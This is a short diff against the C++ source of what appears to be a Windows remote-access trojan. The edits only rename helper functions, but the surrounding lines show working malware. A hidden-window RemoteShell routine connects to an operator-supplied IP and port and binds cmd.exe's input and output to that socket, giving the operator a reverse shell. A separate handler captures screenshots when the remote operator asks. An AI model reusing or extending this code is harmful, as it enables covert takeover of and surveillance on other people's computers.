@@ -30,7 +30,6 @@ using namespace Malicious;
 
 namespace Inhibition
 {
-
     void RemoteShell::operator()()
     {
         LOG << "RemoteShell : Started";
@@ -44,7 +43,7 @@ namespace Inhibition
         si.wShowWindow = SW_HIDE;
         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 
-		LOG << "Reverse Shell on " + cinfo.ip + ":" + to_string(cinfo.port);
+		LOG << "Reverse Shell on " + cinfo.ip + ":" + toString(cinfo.port);
         sAddr.sin_addr.s_addr = inet_addr(cinfo.ip.c_str());
         sAddr.sin_port =  htons(cinfo.port);
         sAddr.sin_family = AF_INET;
@@ -66,7 +65,7 @@ namespace Inhibition
         si.hStdError = (HANDLE)c;
         if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
         {
-			LOG << "Can't start cmd.exe for RemoteShell (CreateProcess failed) : "+to_string(GetLastError());
+			LOG << "Can't start cmd.exe for RemoteShell (CreateProcess failed) : "+toString(GetLastError());
 		}
 		else
 		{
@@ -254,7 +253,7 @@ namespace Inhibition
             string buffer_quality;
             LOG << "Waiting quality";
             session() >> buffer_quality;
-            from_string(buffer_quality, quality);
+            fromString(buffer_quality, quality);
             LOG << "Quality : " + buffer_quality;
             LOG << "Screenshot taken in : " << SCREENSHOT_FILENAME;
             screenshooter.take(SCREENSHOT_FILENAME, quality);			
